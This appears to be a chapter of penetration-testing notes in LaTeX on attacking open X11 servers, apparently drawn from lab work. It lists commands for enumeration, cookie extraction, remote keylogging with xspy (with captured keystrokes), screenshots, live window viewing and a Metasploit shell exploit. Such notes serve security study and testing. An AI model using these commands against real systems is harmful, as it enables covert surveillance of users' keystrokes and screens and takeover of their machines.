\chapter{X11}

\input{network/x11/intro}

\section{Footprinting}

\begin{verbatim}
PORT       STATE   SERVICE
6000/tcp   open    X11
\end{verbatim}

\section{Enumeration}

on local:
\begin{verbatim}
$ who
ross tty7

$ w
 05:55:03 up  2:19,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               03:35    2:19m 13.83s  0.07s /usr/libexec/gnome-session-binary --systemd --session=gnome
\end{verbatim}

\begin{verbatim}
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
\end{verbatim}

\subsection{nmap additionals scripts}

\url{https://github.com/sensepost/x11-active-displays}

\section{authentication}
\subsection{xhost}

\subsection{xauth}

\begin{verbatim}
$ xauth -f .Xauthority 
Using authority file .Xauthority
xauth> list
squashed.htb/unix:0  MIT-MAGIC-COOKIE-1  04f643e487e99a3ebb2d6a1c5e27dc31
\end{verbatim}


\section{Verfy Connection}
\begin{verbatim}
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> 
#Ex: xwininfo -root -tree -display 10.5.5.12:0
\end{verbatim}

\section{Keyloggin}

\href{http://tools.kali.org/sniffingspoofing/xspy}{xspy}

\begin{verbatim}
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
\end{verbatim}


\section{Screenshots capturing}

\begin{verbatim}
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
\end{verbatim}

\section{Remote Desktop View}
\subsection{xrdp.py}

\begin{verbatim}
./xrdp.py <IP:0>
\end{verbatim}

See~\href{https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref}{Exploiting
X11 unauthenticated access}

\subsection{xwatchwin}
First we need to find the ID of the window using xwininfo
\begin{verbatim}
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

...SNIP...
\end{verbatim}


\begin{verbatim}
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
\end{verbatim}


\section{Get Shell}

\subsection{Metasploit}
\begin{verbatim}
msf> use exploit/unix/x11/x11_keyboard_exec
\end{verbatim}


\subsection{xrdpi.py}

